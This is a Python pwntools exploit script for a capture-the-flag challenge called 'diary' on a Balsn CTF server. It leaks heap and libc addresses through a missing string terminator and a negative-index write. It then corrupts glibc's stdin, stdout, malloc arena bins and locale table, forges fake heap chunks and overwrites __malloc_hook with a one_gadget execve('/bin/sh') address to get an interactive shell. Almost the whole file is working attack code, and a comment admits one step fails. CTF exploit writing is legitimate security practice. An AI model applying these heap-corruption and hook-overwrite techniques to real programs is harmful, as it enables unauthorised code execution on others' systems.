#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        # Check this out!
        # diary.dbg: https://github.com/mephi42/dwarfexport/tree/vmlinux
        # api=True: https://github.com/Gallopsled/pwntools/pull/1695
        return gdb.debug(['./diary.dbg'], api=True)
    else:
        return remote('diary.balsnctf.com', 10101)


def send_int(tube, i):
    tube.send(f'{i:3}')


CTYPE_B = bytearray((
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x03, 0x20, 0x02, 0x20, 0x02, 0x20,
    0x02, 0x20, 0x02, 0x20, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00,
    0x01, 0x60, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x08, 0xd8, 0x08, 0xd8, 0x08, 0xd8, 0x08, 0xd8,
    0x08, 0xd8, 0x08, 0xd8, 0x08, 0xd8, 0x08, 0xd8,
    0x08, 0xd8, 0x08, 0xd8, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x08, 0xd5, 0x08, 0xd5, 0x08, 0xd5,
    0x08, 0xd5, 0x08, 0xd5, 0x08, 0xd5, 0x08, 0xc5,
    0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5,
    0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5,
    0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5,
    0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5,
    0x08, 0xc5, 0x08, 0xc5, 0x08, 0xc5, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0,
    0x04, 0xc0, 0x08, 0xd6, 0x08, 0xd6, 0x08, 0xd6,
    0x08, 0xd6, 0x08, 0xd6, 0x08, 0xd6, 0x08, 0xc6,
    0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6,
    0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6,
    0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6,
    0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6,
    0x08, 0xc6, 0x08, 0xc6, 0x08, 0xc6, 0x04, 0xc0,
    0x04, 0xc0, 0x04, 0xc0, 0x04, 0xc0, 0x02, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
))
PREV_INUSE = 1


def calloc_breakpoint(tube):
    tube.gdb.interrupt_and_wait()
    tube.gdb.Breakpoint('calloc', temporary=True)
    tube.gdb.continue_nowait()


def calloc_wait(tube, expected):
    tube.gdb.wait()
    n = int(tube.gdb.parse_and_eval('$rdi'))
    elem_size = int(tube.gdb.parse_and_eval('$rsi'))
    tube.gdb.execute('finish')
    tube.gdb.wait()
    result = int(tube.gdb.parse_and_eval('$rax'))
    print(f'calloc({n}, {elem_size}) = 0x{result:x}')
    assert result == expected
    tube.gdb.continue_nowait()


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()

        # BUG: name without trailing \0.
        tube.recvuntil(b'What\'s your name : ')
        name = b'A' * 32
        tube.send(name)

        # tcache x7, victim x1, guard x1.
        chunk_hdr_size = 16
        unsorted_entry_size = 16
        chunk_data_size = 128
        sizeof_len = 4
        tcache_idx = [0, 1, 2, 3, 4, 5, 6]
        victim_idx = 7
        guard_idx = 8
        fake_chunk_off = 0xc
        for i in range(guard_idx + 1):
            tube.recvuntil(b'choice : ')
            send_int(tube, 2)  # Write Diary.
            tube.recvuntil(b'Diary Length : ')
            send_int(tube, chunk_data_size)
            tube.recvuntil(b'Diary Content : ')
            if i == 0:
                # Create a table with character flags for atoi() repair.
                tube.send(CTYPE_B[sizeof_len:chunk_data_size])
            elif i == 1:
                # Create a fake fastbins[size=0x80] chunk.
                tube.send(flat({
                    fake_chunk_off: struct.pack('<QQQ', 0, 0x80, 0),
                }, length=chunk_data_size))
            elif i == 2:
                # Create a fake fastbins[size=0x70] chunk.
                tube.send(flat({
                    fake_chunk_off: struct.pack('<QQQ', 0, 0x70, 0),
                }, length=chunk_data_size))
            else:
                tube.send(b'A' * chunk_data_size)

        # Leak heap address.
        tube.recvuntil(b'choice : ')
        send_int(tube, 1)  # Show Name.
        tube.recvuntil(name)
        leak_suffix = b'\n===================='
        leak = tube.recvuntil(leak_suffix)
        page0, = struct.unpack(
            '<Q', leak[:-len(leak_suffix)].ljust(8, b'\0'))
        print(f'g.pages[0] = 0x{page0:x}')
        page1 = page0 + (chunk_hdr_size + chunk_data_size)
        print(f'g.pages[1] = 0x{page1:x}')
        page1_0x80_chunk = page1 + sizeof_len + fake_chunk_off
        print(f'page1_0x80_chunk = 0x{page1_0x80_chunk:x}')
        assert page1_0x80_chunk & 0xf == 0
        page1_0x30_chunk1 = (page1_0x80_chunk + chunk_hdr_size + sizeof_len +
                             fake_chunk_off)
        print(f'page1_0x30_chunk1 = 0x{page1_0x30_chunk1:x}')
        assert page1_0x30_chunk1 & 0xf == 0
        page1_0x30_chunk2 = page1_0x30_chunk1 + 0x30
        print(f'page1_0x30_chunk2 = 0x{page1_0x30_chunk2:x}')
        assert page1_0x30_chunk2 & 0xf == 0
        page2 = page0 + (chunk_hdr_size + chunk_data_size) * 2
        print(f'g.pages[2] = 0x{page2:x}')
        page2_0x70_chunk = page2 + sizeof_len + fake_chunk_off
        print(f'page2_0x70_chunk = 0x{page2_0x70_chunk:x}')
        assert page2_0x70_chunk & 0xf == 0
        page2_0x30_chunk = (page2_0x70_chunk + chunk_hdr_size + sizeof_len +
                            fake_chunk_off)
        print(f'page2_0x30_chunk1 = 0x{page2_0x30_chunk:x}')
        top = (page0 + (chunk_hdr_size + chunk_data_size) * guard_idx +
               chunk_data_size)
        print(f'top = 0x{top:x}')
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            gdb_page0 = tube.gdb.parse_and_eval('g.pages[0]') \
                .cast(tube.gdb.lookup_type('long'))
            assert gdb_page0 == page0
            gdb_page1 = tube.gdb.parse_and_eval('g.pages[1]') \
                .cast(tube.gdb.lookup_type('long'))
            assert gdb_page1 == page1
            gdb_page2 = tube.gdb.parse_and_eval('g.pages[2]') \
                .cast(tube.gdb.lookup_type('long'))
            assert gdb_page2 == page2
            tube.gdb.continue_nowait()

        # Put a libc address into memory pointed to by page[victim_idx].
        victim = \
            page0 + (chunk_hdr_size + chunk_data_size) * victim_idx
        print(f'victim = 0x{victim:x}')
        for i in tcache_idx + [victim_idx]:
            tube.recvuntil(b'choice : ')
            send_int(tube, 5)  # Tear out page.
            tube.recvuntil(b'Page : ')
            send_int(tube, i)
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            gdb_victim = tube.gdb.parse_and_eval(f'g.pages[{victim_idx}]') \
                .cast(tube.gdb.lookup_type('long'))
            assert gdb_victim == victim
            gdb_victim_q0 = tube.gdb.parse_and_eval(
                f'*(long *)g.pages[{victim_idx}]')
            assert 0x7f0000000000 <= gdb_victim_q0 < 0x800000000000
            tube.gdb.continue_nowait()

        # BUG: corrupt stdin, main_arena, _nl_global_locale and stdout.
        stdin_idx = -6
        # stdout_idx = -8
        stdin_malloc_hook_off = 0x230
        stdin_malloc_hook_chunk_off = \
            stdin_malloc_hook_off - chunk_hdr_size - unsorted_entry_size
        stdin_main_arena_off = 0x240
        offsetof_fastbins_0x70 = 0x38
        offsetof_fastbins_0x80 = 0x40
        offsetof_top = 0x60
        offsetof_unsortedbin = 0x70
        offsetof_smallbins_0x30 = 0x90
        offsetof_system_mem = 0x888
        stdin_top_off = stdin_main_arena_off + offsetof_top
        stdin_fastbins_0x70_off = stdin_main_arena_off + offsetof_fastbins_0x70
        stdin_fastbins_0x80_off = stdin_main_arena_off + offsetof_fastbins_0x80
        stdin_unsortedbin_off = stdin_main_arena_off + offsetof_unsortedbin
        stdin_smallbins_0x30_off = \
            stdin_main_arena_off + offsetof_smallbins_0x30
        stdin_system_mem_off = stdin_main_arena_off + offsetof_system_mem
        stdin_nl_global_locale_off = 0xb60
        offsetof_ctype_b = 0x68
        stdin_ctype_b_off = stdin_nl_global_locale_off + offsetof_ctype_b
        stdin_stdout_off = 0xd60
        tube.recvuntil(b'choice : ')
        send_int(tube, 4)  # Edit Diary.
        tube.recvuntil(b'Page : ')
        send_int(tube, stdin_idx)
        tube.recvuntil(b'Content : ')
        buf = flat({
            # Create a fake chunk around __malloc_hook.
            stdin_malloc_hook_chunk_off: struct.pack(
                '<QQQQ', 0, 0x30, page1_0x30_chunk1, page1_0x30_chunk2),
            # Corrupt fastbins[size=0x70].
            stdin_fastbins_0x70_off: struct.pack('<Q', page2_0x70_chunk),
            # Corrupt fastbins[size=0x80].
            stdin_fastbins_0x80_off: struct.pack('<Q', page1_0x80_chunk),
            # Repair top chunk.
            stdin_top_off: struct.pack('<Q', top),
            # Corrupt unsorted bin.
            stdin_unsortedbin_off: struct.pack(
                '<QQ', page1_0x30_chunk2, page1_0x30_chunk1),
            # Corrupt smallbins[size=0x30].
            stdin_smallbins_0x30_off:
                struct.pack('<QQ', page2_0x30_chunk, page2_0x30_chunk),
            # Repair system_mem.
            stdin_system_mem_off: struct.pack('<Q', 0x21000),
            # Repair atoi().
            stdin_ctype_b_off: struct.pack('<Q', page0),
            # Corrupt stdout.
            stdin_stdout_off: struct.pack(
                '<IIQQQQQQQQ',
                0xfbad2887,  # _flags.
                0,  # hole.
                victim,  # _IO_read_ptr.
                victim,  # _IO_read_end.
                victim,  # _IO_read_base.
                victim,  # _IO_write_base.
                victim + 8,  # _IO_write_ptr.
                victim + 8,  # _IO_write_end.
                victim,  # _IO_buf_base.
                victim + 8,  # _IO_buf_end.
            ),
        }, filler=b'\0')
        sizeof_flags = 4
        tube.send(buf[sizeof_flags:])  # stdin flags overlap len.
        # Leak libc address.
        leak_suffix = b'===================='
        leak = tube.recvuntil(leak_suffix)
        victim_q0, = struct.unpack(
            '<Q', leak[:-len(leak_suffix)])
        print(f'victim_q0 = 0x{victim_q0:x}')
        if args.LOCAL:
            assert gdb_victim_q0 == victim_q0
        libc = victim_q0 - 0x1e4ca0
        print(f'libc = 0x{libc:x}')
        assert libc & 0xfff == 0
        stdin = libc + 0x1e4a00
        print(f'stdin = 0x{stdin:x}')

        # Trigger allocation of a fake fastbins[size=0x70] chunk.
        if args.LOCAL:
            calloc_breakpoint(tube)
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        diary_length = 0x70 - chunk_hdr_size - sizeof_len
        send_int(tube, diary_length)
        if args.LOCAL:
            calloc_wait(tube, page2_0x70_chunk + chunk_hdr_size)
        tube.recvuntil(b'Diary Content : ')
        # Create a fake smallbins[size=0x30] chunk.
        smallbins_0x30_chunk = (stdin + stdin_smallbins_0x30_off -
                                chunk_hdr_size)
        tube.send(flat({
            fake_chunk_off: struct.pack(
                '<QQQQ', 0, 0x30, smallbins_0x30_chunk, smallbins_0x30_chunk),
        }, length=diary_length))

        # Trigger allocation of a fake smallbins[size=0x30] chunk.
        # This completes smallbin repair.
        if args.LOCAL:
            calloc_breakpoint(tube)
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        diary_length = 0x30 - chunk_hdr_size - sizeof_len
        send_int(tube, diary_length)
        if args.LOCAL:
            calloc_wait(tube, page2_0x30_chunk + chunk_hdr_size)
        tube.recvuntil(b'Diary Content : ')
        tube.send(flat({}, length=diary_length))

        # Trigger allocation of a fake fastbins[size=0x80] chunk.
        if args.LOCAL:
            calloc_breakpoint(tube)
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        diary_length = 0x80 - chunk_hdr_size - sizeof_len
        send_int(tube, diary_length)
        if args.LOCAL:
            calloc_wait(tube, page1_0x80_chunk + chunk_hdr_size)
        tube.recvuntil(b'Diary Content : ')
        # Create two fake unsorted[size=0x30] chunks.
        unsortedbin_chunk = stdin + stdin_unsortedbin_off - chunk_hdr_size
        malloc_hook_chunk = stdin + stdin_malloc_hook_chunk_off
        tube.send(flat({
            fake_chunk_off: struct.pack(
                '<QQQQ', 0, 0x30, unsortedbin_chunk, malloc_hook_chunk),
            fake_chunk_off + 0x30: struct.pack(
                '<QQQQ', 0x30, 0x30, malloc_hook_chunk, unsortedbin_chunk),
        }, length=diary_length))

        # Trigger allocation of page1_0x30_chunk1.
        if args.LOCAL:
            calloc_breakpoint(tube)
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        diary_length = 0x30 - chunk_hdr_size - sizeof_len
        send_int(tube, diary_length)
        if args.LOCAL:
            input('PAUSE')
            calloc_wait(tube, page1_0x30_chunk1 + chunk_hdr_size)
        tube.recvuntil(b'Diary Content : ')
        tube.send(flat({}, length=diary_length))

        input('PAUSE')

        # Trigger allocation of a fake fastbins[size=0x20] chunk within libc.
        if args.LOCAL:
            calloc_breakpoint(tube)
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        diary_length = 0x20 - chunk_hdr_size - sizeof_len
        send_int(tube, diary_length)
        if args.LOCAL:
            # Doesn't work, because the previous calloc() will poison tcache
            # instead of fastbins, and we cannot allocate from tcache.
            calloc_wait(tube, malloc_hook_chunk + chunk_hdr_size)
        tube.recvuntil(b'Diary Content : ')
        # Overwrite malloc_hook with one_gadget.
        '''
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
        tube.send(flat({
            0: struct.pack('<Q', libc + 0x106ef8),
        }, length=diary_length))

        # Trigger any allocation.
        tube.recvuntil(b'choice : ')
        send_int(tube, 2)  # Write Diary.
        tube.recvuntil(b'Diary Length : ')
        send_int(tube, chunk_data_size)

        # Victory?!
        tube.interactive()


if __name__ == '__main__':
    main()
